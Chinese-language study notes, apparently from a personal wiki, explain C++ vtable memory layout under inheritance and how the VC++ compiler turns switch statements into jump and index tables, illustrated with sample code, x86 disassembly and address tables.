printf(&quot;Derived::Fn_6 called ... &quot;); &#125;&#125;;int main(int argc, char *argv[])&#123; // 查看 derived 的虚函数表 Derived derived; // 观察大小 printf(&quot;%d &quot;, sizeof(derived)); // 有2个虚表 // 通过函数指针调用函数，验证正确性 typedef void (*pFunction)(void); pFunction pFn; // 第1个虚表 printf(&quot;subderived 的虚函数表地址为：%x &quot;, *(DWORD*)&amp;derived); // 对象的第1个虚表地址 for (int i = 0; i &lt; 6; i++) &#123; int temp = *((DWORD*)(*(DWORD*)&amp;derived) + i); if (!temp) // 读虚表内容读多了，就break，跳出本次循环 &#123; break; &#125; pFn = (pFunction)temp; pFn(); &#125; printf(&quot;%d &quot;, sizeof(Base1)); // 观察Base1的大小，因为找第2个虚表要跳过Base1占的内存空间 // 第2个虚表 DWORD vptr2 = (DWORD)&amp;derived + sizeof(Base1); printf(&quot;subderived 的虚函数表地址为：%x &quot;, *(DWORD*)vptr2); // 对象的第2个虚表地址 for (int j = 0; j &lt; 2; j++) &#123; int temp = *((DWORD*)(*(DWORD*)vptr2) + j); if (!temp) // 读虚表内容读多了，就break，结束当前整个循环结构 &#123; break; &#125; pFn = (pFunction)temp; pFn(); &#125; return 0;&#125; Base1类： 变量：a,b 函数 虚函数Fn_1 虚函数Fn_2 Base2类： 变量：c 函数 虚函数Fn_3 虚函数Fn_4 SubDerived类： 变量：d 函数 虚函数Fn_5 虚函数Fn_6 123class Base1&#123;...&#125;;class Base2&#123;...&#125;;class Derived : public Base1, public Base2&#123;...&#125;; 所属类 地址 成员变量 Base1 0x0012FF68 vptr1=0x0042205C 0x0012FF6C a=1 0x0012FF70 b=2 Base2 0x0012FF74 vptr2=0x00422110 0x0012FF78 c=3 Derived 0x0012FF7C d=4 虚表1 地址 值 内容 \"vptr1-> 0x0042205C 0x00401050 Base1::Fn_1函数地址 0x00422060 0x0040105F Base1::Fn_2函数地址 0x00422064 0x0040104B Derived::Fn_5函数地址 0x00422068 0x0040106E Derived::Fn_6函数地址 虚表2 地址 值 内容 \"vptr2->\" 0x00422110 0x00401055 Base2::Fn_3函数地址 0x00422114 0x0040105A Base2::Fn_4函数地址 实验时遇到的代码运行问题这段防止读过头的代码只能保证读过了之后值为0的情况准，不为0的话，还是传给pFn，准备调用，会报0xC0000005。1234if (!temp) // 读虚表内容读多了，就break，结束当前整个循环结构&#123; break;&#125; 多重继承+有函数覆盖 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113#include &lt;stdio.h&gt;#include &lt;windows.h&gt;class Base1&#123;private: int a; int b;public: Base1() &#123; a = 1; b = 2; &#125; virtual void Fn_1() &#123; printf(&quot;Base1::Fn_1 called ... &quot;); &#125; virtual void Fn_2() &#123; printf(&quot;Base1::Fn_2 called ... &quot;); &#125;&#125;;class Base2&#123;private: int c;public: Base2() &#123; c = 3; &#125; virtual void Fn_3() &#123; printf(&quot;Base2::Fn_3 called ... &quot;); &#125; virtual void Fn_4() &#123; printf(&quot;Base2::Fn_4 called ... &quot;); &#125;&#125;;class Derived : public Base1, public Base2&#123;private: int d;public: Derived() &#123; d = 4; &#125; virtual void Fn_1() &#123; printf(&quot;Derived::Fn_1 called ... &quot;); &#125; virtual void Fn_3() &#123; printf(&quot;Derived::Fn_3 called ... &quot;); &#125; virtual void Fn_5() &#123; printf(&quot;Derived::Fn_5 called ... &quot;); &#125;&#125;;int main(int argc, char *argv[])&#123; // 查看 derived 的虚函数表 Derived derived; // 观察大小 printf(&quot;%d &quot;, sizeof(derived)); // 有2个虚表 // 通过函数指针调用函数，验证正确性 typedef void (*pFunction)(void); pFunction pFn; // 第1个虚表 printf(&quot;subderived 的虚函数表地址为：%x &quot;, *(DWORD*)&amp;derived); // 对象的第1个虚表地址 for (int i = 0; i &lt; 6; i++) &#123; int temp = *((DWORD*)(*(DWORD*)&amp;derived) + i); if (!temp) // 读虚表内容读多了，就break，跳出本次循环 &#123; break; &#125; pFn = (pFunction)temp; pFn(); &#125; printf(&quot;%d &quot;, sizeof(Base1)); // 观察Base1的大小，因为找第2个虚表要跳过Base1占的内存空间 // 第2个虚表 DWORD vptr2 = (DWORD)&amp;derived + sizeof(Base1); printf(&quot;subderived 的虚函数表地址为：%x &quot;, *(DWORD*)vptr2); // 对象的第2个虚表地址 for (int j = 0; j &lt; 2; j++) &#123; int temp = *((DWORD*)(*(DWORD*)vptr2) + j); if (!temp) // 读虚表内容读多了，就break，结束当前整个循环结构 &#123; break; &#125; pFn = (pFunction)temp; pFn(); &#125; return 0;&#125; Base1类： 变量：a,b 函数 虚函数Fn_1 虚函数Fn_2 Base2类： 变量：c 函数 虚函数Fn_3 虚函数Fn_4 类： 变量：d 函数 虚函数Fn_1，override 虚函数Fn_3，override 虚函数Fn_5 123class Base1&#123;...&#125;;class Base2&#123;...&#125;;class Derived : public Base1, public Base2&#123;...&#125;; 所属类 地址 成员变量 Base1 0x0012FF68 vptr1=0x0042205C 0x0012FF6C a=1 0x0012FF70 b=2 Base2 0x0012FF74 vptr2=0x00422110 0x0012FF78 c=3 Derived 0x0012FF7C d=4 虚表1 地址 值 内容 \"vptr1->\"\" 0x0042205C 0x00401064 Derived::Fn_1函数地址 0x00422060 0x0040105F Base1::Fn_2函数地址 0x00422064 0x0040104B Derived::Fn_5函数地址 虚表2 地址 值 内容 \"vptr2->\" 0x00422110 0x00401069 Derived::Fn_3函数地址 0x00422114 0x0040105A Base2::Fn_4函数地址 小结 带有虚函数的类，其对象起始处是vptr，然后才是成员变量。vptr指向vtable，vtable中依次存放类中虚函数的函数地址（虚函数在类中写的先后顺序），有几个虚函数，虚表中就有几个地址。 如果子类没有对基类声明的虚函数进行重写（override），那么表项中的是父类的虚函数地址。 如果重写了，这一项则是子类重写的函数地址。 对于多重继承，虚表的个数=继承父类的个数。内存布局先是第一个父类的内存，然后是第二个父类的内存，…，最后才是子类的。 子类新增的虚函数函数地址是在第一个虚表中。 override了父类哪个的虚函数就在哪个表中，没有override就仍是父类的。 为什么要多个虚表？还是以前面的为例，Derived类同时继承了Base1和Base2类，Base1类和Base2类都有自己的虚表，然后Derived类为什么要有两个虚表？答：因为要确保多态能正确工作。在这个继承关系下的upcasting：可以用Base1类型的指针/引用来访问访问Derived对象可以用Base2类型的指针/引用来访问访问Derived对象要确保使用Base1类型的指针/引用和Base2类型的指针/引用访问Derived对象时，可以正确地调用虚函数：当通过Base1类型的引用/指针调用虚函数时，需要使用Base1的虚表来确定要调用的虚函数通过Base2类型的引用/指针调用虚函数时，，需要使用Base2的虚表来确定要调用的虚函数如果不设计成两个虚表，当虚函数重写，或，多态调时调用的哪个函数你知道吗"},{"title":"虚表（简化版文章）","path":"/wiki/C++/虚表.html","content":"这是看视频课做的笔记，后面看大课写了&quot;虚函数&quot;，&quot;多态&quot;两个文章，这篇就留着，作为简化版，删了可惜。 注意early binding(早捆绑/静态捆绑)和late binding那里不严谨，只有virtual+父类指针/引用指向子类对象，才是late binding 本小节介绍C++通过虚函数来实现多态的底层原理。 探索和观察 函数调用 例A：父类中的Print是普通成员函数，子类override了父类的Print函数 例B：父类中的Print是虚函数，子类override了父类的Print函数。 观察b.PrintBase()中b.Print()汇编指令的调用方式。 例A：early binding(早捆绑/静态捆绑)例B：late binding(晚捆绑/动态捆绑)观察到是直接调用方式，call 函数地址(00401023)，函数地址是死的。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;class Base&#123;private: int x; int y;public: Base() &#123;&#125; void Print() &#123; printf(&quot;Base::Print() called &quot;); &#125;&#125;;class Derived : public Base&#123;private: int z;public: Derived() &#123; &#125; void Print() &#123; printf(&quot;Derived::Print() called &quot;); &#125;&#125;;void PrintBase(Base&amp; b)&#123; b.Print();&#125;int main()&#123; Base b; PrintBase(b); printf(&quot; &quot;); Derived d; PrintBase(d); return 0;&#125; 执行输出1234Base::Print() called Base::Print() called 观察到是间接调用方式，通过edx间接寻址来调用函数。 123450040D408 mov eax,dword ptr [ebp+8]0040D40B mov edx,dword ptr [eax];...;检查堆栈平衡相关，省略0040D412 call dword ptr [edx] 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;class Base&#123;private: int x; int y;public: Base() &#123;&#125; virtual void Print() &#123; printf(&quot;Base::Print() called &quot;); &#125;&#125;;class Derived : public Base&#123;private: int z;public: Derived() &#123; &#125; void Print() &#123; printf(&quot;Derived::Print() called &quot;); &#125;&#125;;void PrintBase(Base&amp; b)&#123; b.Print();&#125;int main()&#123; Base b; PrintBase(b); printf(&quot; &quot;); Derived d; PrintBase(d); //upcasting return 0;&#125; 执行输出1234Base::Print() called Derived::Print() called 发现例B虚函数那个，通过函数参数（[ebp+8]），this指针指向的第一个4字节，来间接寻址。疑问：按之前学的，对象中第一个成员在这里例子中是数据成员x呀，x能来拿来间接寻址用？于是，接着分别探测下例A和例B中Base类的总大小是多少 类的大小 例A：类中无虚函数例B：类中有虚函数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;class Base&#123;private: int x; int y;public: Base() &#123;&#125; void Print() &#123; printf(&quot;Base::Print() called &quot;); &#125;&#125;;class Derived : public Base&#123;private: int z;public: Derived() &#123; &#125; void Print() &#123; printf(&quot;Derived::Print() called &quot;); &#125;&#125;;void PrintBase(Base&amp; b)&#123; b.Print();&#125;int main()&#123; Base b; printf(&quot;%d &quot;,sizeof(b)); printf(&quot; &quot;); Derived d; printf(&quot;%d &quot;,sizeof(d)); return 0;&#125; 执行输出12348121234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;class Base&#123;private: int x; int y;public: Base() &#123;&#125; virtual void Print() &#123; printf(&quot;Base::Print() called &quot;); &#125;&#125;;class Derived : public Base&#123;private: int z;public: Derived() &#123; &#125; void Print() &#123; printf(&quot;Derived::Print() called &quot;); &#125;&#125;;void PrintBase(Base&amp; b)&#123; b.Print();&#125;int main()&#123; Base b; printf(&quot;%d &quot;,sizeof(b)); printf(&quot; &quot;); Derived d; printf(&quot;%d &quot;,sizeof(d)); return 0;&#125; 执行输出12341216 可以在Base类和Derived类中多加几个虚函数，再次观察大小，这里略 类中无虚函数时，类的大小为：成员变量大小之和 类中有虚函数时（至少1个，有1个和有100个的大小一样），类的大小为：4字节大小+成员变量大小之和 多出来的这4字节大小在哪，是什么内容？ 虚表 当一个类有虚函数后，该对象的起始地址不再是成员变量，而是一个4字节大小的地址，这个地址指向一个数组，数组里存放的是类中所有虚函数的函数地址（按虚函数在代码中声明的先后顺序） 多态的本质：间接调用+虚表 这个地址称为虚函数地址表指针，vpointer，vptr 这个数组被称为虚函数地址表（简称虚表），virtualtable，vtable 在VC中可以在调试时变量监视窗口看到vptr的值 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;stdio.h&gt;class Base&#123;private: int x; int y;public: Base() &#123;&#125; virtual void Print() &#123; printf(&quot;Base::Print() called &quot;); &#125; virtual void Print2() &#123; printf(&quot;Base::Print2() called &quot;); &#125;&#125;;class Derived : public Base&#123;private: int z;public: Derived() &#123; &#125; void Print() &#123; printf(&quot;Derived::Print() called &quot;); &#125;&#125;;void PrintBase(Base&amp; b)&#123; b.Print(); b.Print2();&#125;int main()&#123; Base b; PrintBase(b); printf(&quot; &quot;); Derived d; PrintBase(d); return 0;&#125; Print()在虚表第1项，call [edx]；Print2()在虚表第2项，call [edx+4] 反汇编窗口，Ctrl+G输入跟进这个地址 b对象内存布局 值 虚表表项 内容 vptr 0x00422e80-&gt; 0x00422e80 00401014，Base::Print函数地址 x 0x00422e84 00401023，Base::Print2函数地址 y d对象内存布局 值 虚表表项 内容 vptr 0x00422eb8-&gt; 0x0040100A 0040100A，Derived::Print函数地址 x 0x00401023 00401023，Base::Print2函数地址 y z 小结 带有虚函数的类，其对象起始处是vptr，然后才是成员变量。vptr指向vtable，vtable中依次存放类中虚函数的函数地址（虚函数在类中写的先后顺序），有几个虚函数，虚表中就有几个地址。 如果子类没有对基类声明的虚函数进行重写（override），那么表项中的是父类的虚函数地址。如果重写了，这一项则是子类重写的函数地址。"},{"title":"switch语句","path":"/wiki/C++_disassembly/switch语句_C++_disassembly.html","content":"严谨点讲，不同编译器算法不同，对于switch语句生成的反汇编也不尽相同。并不是分支数&gt;3就生成地址表。以下以VC++编译器为例，注意体会编译器处理的方式即可。 分支数≤3 编写不超过3条case的switch结构的代码，再用if…else if结构实现相同功能，观察它们的反汇编。 switch结构（VC++_x86_debug）if...else if结构（VC++_x86_debug）12345678910111213141516171819202122#include &lt;stdio.h&gt;int main(int argc, char *argv[])&#123; int n = 1; switch (n) &#123; case 1: printf(&quot;n == 1&quot;); break; case 3: printf(&quot;n == 3&quot;); break; case 100: printf(&quot;n == 100&quot;); break; default: printf(&quot;default&quot;); break; &#125; return 0;&#125; 依次判断，是否等于1，是否等于3，是否等于100。00401047处的jmp跳向default，如果没有default，就到switch语句块结尾。 123456789101112131415161718192021222324#include &lt;stdio.h&gt;int main(int argc, char *argv[])&#123; int n = 1; if (n == 1) &#123; printf(&quot;n == 1&quot;); &#125; else if (n == 3) &#123; printf(&quot;n == 3&quot;); &#125; else if (n == 100) &#123; printf(&quot;n == 100&quot;); &#125; else &#123; printf(&quot;default&quot;); &#125; return 0;&#125; switch分支数≤3时（default不算数），采用模拟if…else if的方法。 结构 if…else 条件跳转后紧跟语句块 switch语句 所有的条件跳转都放置在一起所有的case语句都是连在一起的（这样实现了C语法要求，在case语句中没有break语句时，会顺序执行后续case语句块） 在效率上没有区别，都是一个一个作比较，然后跳or不跳。 小结 看每个条件跳转指令后是否跟有语句块，如果没有，识别为switch分支结构。 case语句块 case的判定值，根据比较信息和jcc指令确定。 起始地址：根据jcc指令跳到的地址来确定。 结束地址 如果有break，会出现jmp指令结尾 如果没有break，用下一个case起始地址来确定。 1234567891011121314151617 mov reg,mem ;取出switch中考察的变量 ;影响标志位的指令 jxx xxxx ;跳转至对应case语句块的首地址处 ;影响标志位的指令 jxx xxxx ;影响标志位的指令 jxx xxxx jmp END ;跳转到switch的结尾地址处 ... ; case语句块的首地址 jmp END ; case语句块结束，有break则产生这个jmp ... ; case语句块的首地址 jmp END ; case语句块的结束，有break则产生这个jmp ...... ; case语句块的首地址 jmp END ; case语句块结束，有break则产生这个jmpEND: ... ; switch结尾 地址表（大表） 当分支数&gt;3，且case的判定值存在明显线性关系组合时，编译器会为case语句制作一份case地址数组（或称为case地址表，海哥课中称为大表），这个数组保存了每个case语句块的首地址。 下面通过几个例子，逐渐加深对大表的理解 例子 目的 case1-4 最基本的例子 case101-104 体会只要case判定值存在明显线性关系组合，就会使用大表 打乱顺序的case1-4 观察case语句的顺序是否影响大表的生成 中间空缺几项 1. case地址表空缺位置如何处理2. 何时生成小表 case1-4 1234567891011121314151617181920212223242526#include &quot;stdafx.h&quot;int main(int argc, char *argv[])&#123; int n = 1; switch (n) &#123; case 1: printf(&quot;case 1&quot;); break; case 2: printf(&quot;case 2&quot;); break; case 3: printf(&quot;case 3&quot;); break; case 4: printf(&quot;case 4&quot;); break; default: printf(&quot;default&quot;); break; &#125; return 0;&#125; 地址表 编译器制作了一份case地址数组（或称为case地址表，海哥课中称为大表），4字节为1个元素，每个元素都是case语句块的起始地址。 该例子中，4010AAh为这张表的起始地址，后面会用比例因子寻址[edx*4+4010AAh]来查表（这里将查询得到数组某个元素的过程称为查表）。 相对关系 比例因子寻址 地址表的内存地址 项数 地址表中的值 含义 $==&gt; $+4*0 004010AA 第0项 0040104E case1语句块的起始地址 $+4 $+4*1 004010AE 第1项 0040105D case2语句块的起始地址 $+8 $+4*2 004010B2 第2项 0040106C case3语句块的起始地址 $+C $+4*3 004010B6 第3项 0040107B case4语句块的起始地址 流程详细分析 对待考察的变量n作处理，使其可作为数组下标进行寻址 123450040102F mov eax,dword ptr [ebp-4]00401032 mov dword ptr [ebp-8],eax00401035 mov ecx,dword ptr [ebp-8]00401038 sub ecx,1 //对齐于数组下标 004010AA这个地址是需要的，指出地址表起始地址，这个起始地址同时也是第一项元素的地址。而case最小值不一定刚好是0，在这里例子中是从1开始，那么就要减去1，为的是从数组下标0开始。 实际上，sub减去的值是case的最小值，这样就能减到0（例：后面的case101-104）。 特殊情况：case最小值为0，就没有调整这一步了。 待考察的变量n是否处于case范围里 -1对齐后，case的最大值是3（4-1=3），最小值是0，范围是[0,3]。然后判断n是否&gt;3，如果&gt;3，那不在case范围内，直接跳到default/switch语句块结尾。 120040103E cmp dword ptr [ebp-8],300401042 ja $L541+0Fh (0040108a) //跳到default首地址 那如果&lt;case的最小值0呢？这里很妙，因为用的是ja无符号比较指令，当n是一个负数时，负数的补码，当成无符号数解释也会&gt;3。 也就是说，这里的ja就能完成变量n和case范围两端对比的任务： 当n&lt;0（case最小值），ja比较，会大于3 当n&gt;3（case最大值），ja比较，会大于3 保证了switch的参数值n在case的范围之内后，对case地址数组进行查表 100401047 jmp dword ptr [edx*4+4010AAh] 以[edx*4+4010AAh]来查表，得到要去向的case语句块的起始地址。 假设输入给switch的参数值为1，编译器减1调整到case地址数组的下标0后，[edx*4+4010AAh]变成了0*4++4010AAh，为表中第0项，即case1语句块的首地址。 假设输入给switch的参数值为2，编译器减1调整到case地址数组的下标1后，[edx*4+4010AAh]变成了1*4++4010AAh，为表中第1项，即case2语句块的首地址。 其余同理。 n -1调整后的数组下标 是否处于case范围内 edx*4+4010AAh的值 表项 表项的含义 程序的执行流程 -1 -2（-1-1=-2） 补码FFFFFFFE，比3大，跳到default - - - n=-1，执行default 0 -1（0-1=-1） 补码FFFFFFFF，比3大，跳到default - - - n=0，执行default 1 0 &lt;=3，继续执行。在case范围内 0*4+4010AAh 0040104E case1语句块的起始地址 n=1，执行case1 2 1 &lt;=3，继续执行。在case范围内 1*4+4010AAh 0040105D case2语句块的起始地址 n=2，执行case2 3 2 &lt;=3，继续执行。在case范围内 2*4+4010AAh 0040106C case3语句块的起始地址 n=3，执行case3 4 3 &lt;=3，继续执行。在case范围内 3*4+4010AAh 0040107B case4语句块的起始地址 n=4，执行case4 5 4 比3大，跳到default - - - n=5，执行default 从这里可以看出switch比if…else语句高效的原因： 编译器制作了一张大表，表项是各个case分支的起始地址。随后通过switch要考察的参数计算一个表达式，将表达式算出来结果后，这个结果是个地址，指向大表中的表项，随后跳到表项这个地址。 也就是说，我只要把表达式结果算出来，就能得到要直接跳过去地址，而不是像if…else那样一个一个判断，有较多的比较次数。 case101-104 12345678910111213141516171819202122232425#include &quot;stdafx.h&quot;int main(int argc, char *argv[])&#123; int n = 1; switch (n) &#123; case 101: printf(&quot;case 101&quot;); break; case 102: printf(&quot;case 102&quot;); break; case 103: printf(&quot;case 103&quot;); break; case 104: printf(&quot;case 104&quot;); break; default: printf(&quot;default&quot;); break; &#125; return 0;&#125; 100401038 sub ecx,65h 65h=101D，减去101（case最小值）后，就从0开始了。数组范围还是[0,3] 假设输入给switch的参数值为101，编译器减101调整到case地址数组的下标0后，[edx*4+4010AAh]变成了0*4++4010AAh，为表中第0项，即case101语句块的首地址。 假设输入给switch的参数值为102，编译器减101调整到case地址数组的下标1后，[edx*4+4010AAh]变成了1*4++4010AAh，为表中第1项，即case102语句块的首地址。 其余同理。 n -101调整后的数组下标 是否处于case范围内 edx*4+4010AAh的值 表项 表项的含义 程序的执行流程 -1 -102（-1-101=-102） 补码FFFFFF9A，比3大，跳到default - - - n=-1，执行default 0 -101（0-101=-101） 补码FFFFFF9B，比3大，跳到default - - - n=0，执行default 101 0 &lt;=3，继续执行。在case范围内 0*4+4010AAh 0040104E case101语句块的起始地址 n=101，执行case101 102 1 &lt;=3，继续执行。在case范围内 1*4+4010AAh 0040105D case102语句块的起始地址 n=102，执行case102 103 2 &lt;=3，继续执行。在case范围内 2*4+4010AAh 0040106C case103语句块的起始地址 n=103，执行case103 104 3 &lt;=3，继续执行。在case范围内 3*4+4010AAh 0040107B case104语句块的起始地址 n=104，执行case104 105 4 比3大，跳到default - - - n=105，执行default 当case的判定值存在明显线性关系组合，（与case判定值大小无关，不是说case 30000，这么大就不生成大表）就会生成大表。case判定值的大小无所谓，编译器会进行sub调整，最后依然可以从数组下标0开始。 打乱顺序的case1-4 1234567891011121314151617181920212223242526#include &quot;stdafx.h&quot;int main(int argc, char *argv[])&#123; int n = 1; switch (n) &#123; case 4: printf(&quot;case 4&quot;); break; case 2: printf(&quot;case 2&quot;); break; case 1: printf(&quot;case 1&quot;); break; case 3: printf(&quot;case 3&quot;); break; default: printf(&quot;default&quot;); break; &#125; return 0;&#125; 只要case值存在线性关系，就会形成大表，而与case值的顺序无关。 如果case值顺序是打乱的，编译器会在编译过程中对case地址表表项进行排序，如该例中case的顺序为4、2、1、3。那么在case地址表中，会将case语句块的首地址进行排序，将case 1语句块首地址放在case地址表的第0项上，case 2语句块首地址放在表中第1项，以此类推，将case语句块首地址变为一个有序的表格进行存放。 相对关系 比例因子寻址 地址表的内存地址 项数 对应代码中从上到下第几个case语句 地址表中表项的值 值的含义 $==&gt; $+4*0 004010AA 第0项 第3个case语句（case 1） 0040106C case1语句块的起始地址 $+4 $+4*1 004010AE 第1项 第2个case语句（case 2） 0040105D case2语句块的起始地址 $+8 $+4*2 004010B2 第2项 第4个case语句（case 3） 0040107B case3语句块的起始地址 $+C $+4*3 004010B6 第3项 第1个case语句（case 4） 0040104E case4语句块的起始地址 和h2地址表（大表）下地址表那个表格相比，就只是“地址表中的值”这一列发生了变化。 很好理解，查表时，要满足地址表第0项，为最小case值语句块起始地址；地址表第1项，为第二小case值语句块起始地址这种关系。而二进制文件中case语句块的地址高低是由这个case语句块在源码中是低行数还是高行数决定。 中间空缺几项 缺一项 有default缺一项 无default1234567891011121314151617181920212223242526#include &quot;stdafx.h&quot;int main(int argc, char *argv[])&#123; int n = 1; switch (n) &#123; case 1: printf(&quot;case 1&quot;); break; case 2: printf(&quot;case 2&quot;); break; case 3: printf(&quot;case 3&quot;); break; case 5: printf(&quot;case 5&quot;); break; default: printf(&quot;default&quot;); break; &#125; return 0;&#125; 1234567891011121314151617181920212223242526#include &quot;stdafx.h&quot;int main(int argc, char *argv[])&#123; int n = 1; switch (n) &#123; case 1: printf(&quot;case 1&quot;); break; case 2: printf(&quot;case 2&quot;); break; case 3: printf(&quot;case 3&quot;); break; case 5: printf(&quot;case 5&quot;); break; //default: //printf(&quot;default&quot;); //break; &#125; return 0;&#125; 缺两项，有default 1234567891011121314151617181920212223242526#include &quot;stdafx.h&quot;int main(int argc, char *argv[])&#123; int n = 1; switch (n) &#123; case 1: printf(&quot;case 1&quot;); break; case 2: printf(&quot;case 2&quot;); break; case 3: printf(&quot;case 3&quot;); break; case 6: printf(&quot;case 6&quot;); break; default: printf(&quot;default&quot;); break; &#125; return 0;&#125; 为了达到线性有序，如果case值中间空缺几项，编译器会拿defult语句首地址/switch结束地址来填充。 地址表的内存地址 项数 地址表中的值 含义 004010AA 第0项 0040104E case1语句块的起始地址 004010AE 第1项 0040105D case2语句块的起始地址 004010B2 第2项 0040106C case3语句块的起始地址 004010B6 第3项 0040108A default语句起始地址 004010BA 第4项 0040108A default语句起始地址 004010BE 第5项 0040107B case6语句块的起始地址 假设输入给switch的参数值为4，编译器减1调整到case地址数组的下标0后，[edx*4+4010AAh]变成了3*4+4010AAh=0040108A，为表中第3项，即defult语句首地址。逻辑上，待考察参数3进入switch语句块中，没有case与之匹配，有default走default，没default结束switch，从程序执行流程上看，逻辑合理。 n -1调整后的数组下标 是否处于case范围内 edx*4+4010AAh的值 表项 表项的含义 程序的执行流程 -1 -2（-1-1=-2） 补码FFFFFFFE，比5大，跳到default - - - n=-1，执行default 0 -1（0-1=-1） 补码FFFFFFFF，比5大，跳到default - - - n=0，执行default 1 0 &lt;=5，继续执行。在case范围内 0*4+4010AAh 0040104E case1语句块的起始地址 n=1，执行case1 2 1 &lt;=5，继续执行。在case范围内 1*4+4010AAh 0040105D case2语句块的起始地址 n=2，执行case2 3 2 &lt;=5，继续执行。在case范围内 2*4+4010AAh 0040106C case3语句块的起始地址 n=3，执行case3 4 3 &lt;=5，继续执行。在case范围内 3*4+4010AAh 0040107B case4语句块的起始地址 n=4，执行case4 5 4 &lt;=5，继续执行。在case范围内 - - - n=5，执行default 6 5 &lt;=5，继续执行。在case范围内 7 6 比5大，跳到default - - - 间隙≤6会拿defult语句首地址/switch结束地址来补，浪费点内存空间，维持住高效的线性结构，但缺得多了也不好使，如果间隙&gt;6，这种填充方式会极大地浪费内存空间。那么，编译器怎么优化？采用大表+小表的方式。 小结 大表switch结构识别的关键点： 获取某一个值进行调整（可能没调整这一步） 跳转指令jcc进行范围检查 如果不在这个范围，则跳走 如果在这个范围，则不跳走，继续执行 跳转指令后紧跟jmp指令，并且是相对比例因子寻址方式 123456789101112;调整mov reg,mem ;取待考察的表达式结果... ;进行调整，对齐case地址表的0下标。有可能没有调整这一步;判断case范围... ;影响标志位的指令，进行范围检查jxx DEFAULT_ADDR ;不在case范围，跳到default语句首地址或switch语句块结束地址;查表mov eax, [reg+xxxx] ;[reg+xxxx]存的是调整后的值 ;eax也可用其他寄存器替换，这里也可以是其他类型的运算jmp dword ptr [eax*4+xxxx] ;地址xxxx为case地址表的首地址 default语句首地址/switch结束地址 由范围检查jcc的地址确定 地址表中重复的项 case地址表 起始地址：相对比例因子寻址方式中的基址 case语句块 case的判定值 case地址表是一个有序表，以下标为0开始。用下标+反向调整（调整数组下标时相反的操作）得到case的标号值。比如，在switch语句块中是通过-1来调整数组下标，那么case地址表第0项对应的是case 1(0+1=1)。按此，依次还原后续case语句块。 起始地址 地址表中的表项就是case语句的起始地址 结束地址 两个case起始地址之间 地址表+索引表（大表+小表） 12345678910111213141516171819202122232425262728293031#include &quot;stdafx.h&quot;int main(int argc, char *argv[])&#123; int n = 1; switch (n) &#123; case 1: printf(&quot;case 1&quot;); break; case 2: printf(&quot;case 2&quot;); break; case 3: printf(&quot;case 3&quot;); break;\t//case 9: //printf(&quot;case 10&quot;); //break; case 10: printf(&quot;case 10&quot;); break; case 11: printf(&quot;case 11&quot;); break; default: printf(&quot;default&quot;); break; &#125; return 0;&#125; 编译器除了生成地址表（大表）外，还生成了一个索引表（小表）。 地址表 存放case语句首地址，default语句块首地址/switch结束地址。 default语句块/switch结束地址只会保存一份，不会像有序线性地址表那样为了填补间隙而重复保存多次。 地址表的个数：case语句块数量+1（default语句块首地址/switch结束地址） 该例子中，40D831h为这张表的起始地址，后面会用比例因子寻址[edx*4+40D831h]来查表（这里将查询得到数组某个元素的过程称为查表）。 相对关系 比例因子寻址 地址表的内存地址 项数 地址表中的值 含义 $==&gt; $+4*0 0040D831 第0项 0040D7C6 case1语句块的起始地址 $+4 $+4*1 0040D835 第1项 0040D7D5 case2语句块的起始地址 $+8 $+4*2 0040D839 第2项 0040D7E4 case3语句块的起始地址 $+C $+4*3 0040D83D 第3项 0040D7F3 case10语句块的起始地址 $+10 $+4*4 0040D841 第4项 0040D802 case11语句块的起始地址 $+14 $+4*5 0040D845 第5项 0040D811 default语句块首地址 索引表 每一项大小是1个字节，存放地址表的索引编号。 索引表的个数：最大case值和最小case值的差。 每一项大小是1个字节，00-FF，最多可以保存256项。也就是说，case值的总个数不能超过256个，要不用1个字节就没法表示了。 该例子中，40D849h为这张表的起始地址，后面会用比例因子寻址(0040d849)[eax]来查表（这里将查询得到数组某个元素的过程称为查表）。 (0040d849)[eax]就是[eax+0040d849] 相对关系 比例因子寻址 地址表的内存地址 项数 地址表中的值 含义 查地址表得到的是 $==&gt; $+0*1 0040D849 第0项 00 第0项 case1语句块的起始地址 $+1 $+1*1 0040D84A 第1项 01 第1项 case2语句块的起始地址 $+2 $+2*1 0040D84B 第2项 02 第2项 case3语句块的起始地址 $+3 $+3*1 0040D84C 第3项 05 第5项 default语句块首地址 $+4 $+4*1 0040D84D 第4项 05 第5项 default语句块首地址 $+5 $+5*1 0040D84E 第5项 05 第5项 default语句块首地址 $+6 $+6*1 0040D84F 第6项 05 第5项 default语句块首地址 $+7 $+7*1 0040D850 第7项 05 第5项 default语句块首地址 $+8 $+8*1 0040D851 第8项 05 第5项 default语句块首地址 $+9 $+9*1 0040D852 第9项 03 第3项 case10语句块的起始地址 $+A $+A*1 0040D853 第10项 04 第4项 case11语句块的起始地址 流程详细分析 对待考察的变量n作处理，使其可作为数组下标进行寻址 123450040D79F mov eax,dword ptr [ebp-4]0040D7A2 mov dword ptr [ebp-8],eax0040D7A5 mov ecx,dword ptr [ebp-8]0040D7A8 sub ecx,1 //对齐于数组下标 与前面同，此处略 待考察的变量n是否处于case范围 1230040D7AB mov dword ptr [ebp-8],ecx0040D7AE cmp dword ptr [ebp-8],0Ah0040D7B2 ja $L543+0Fh (0040d811) //跳到default首地址 与前面同，此处略 保证了switch的参数值n在case的范围之内后，进行二次查表 第一次查表，查索引表 1230040D7B4 mov eax,dword ptr [ebp-8]0040D7B7 xor edx,edx0040D7B9 mov dl,byte ptr (0040d849)[eax] (0040d849)[eax]就是[eax+0040d849]，取的是byte类型，得到地址表的下标。 第二次查表，查地址表 再根据这个下标值，找到地址表中对应的case语句块首地址 10040D7BF jmp dword ptr [edx*4+40D831h] 假设输入给switch的参数值为1，编译器减1调整到case地址数组的下标0后。第一次查表，查索引表，(0040d849)[eax]变成了(0040d849)[0]，为索引表中第0项，为00。第二次查表，查地址表，[edx*4+40D831h]变成了[0*4+40D831h]，为表中第0项，即case1语句块的起始地址。 